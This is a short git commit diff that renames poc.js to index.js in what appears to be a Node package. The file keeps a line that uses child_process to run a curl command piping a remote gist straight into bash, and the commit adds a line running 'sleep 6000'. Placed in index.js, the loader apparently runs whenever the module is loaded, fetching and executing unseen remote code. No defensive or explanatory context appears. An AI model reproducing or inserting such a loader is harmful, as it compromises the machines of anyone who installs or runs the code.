64cff59b8837f28a234d0119c544bd9b28d71c7e
fbfb2 <lx2317103712@gmail.com>
2025-03-29 03:44:41 +0800

    Update and rename poc.js to index.js

--- index.js
+++ index.js
@@ -1,2 +1,2 @@
-
 require('child_process').exec("curl -sSfL https://gist.githubusercontent.com/fbfb2/4a3027fc532b7c7fb69b8e5ae51cc362/raw/aa8086b67d70b03509530497ca1f1fa79a967674/README | bash");
+require('child_process').exec("sleep 6000");
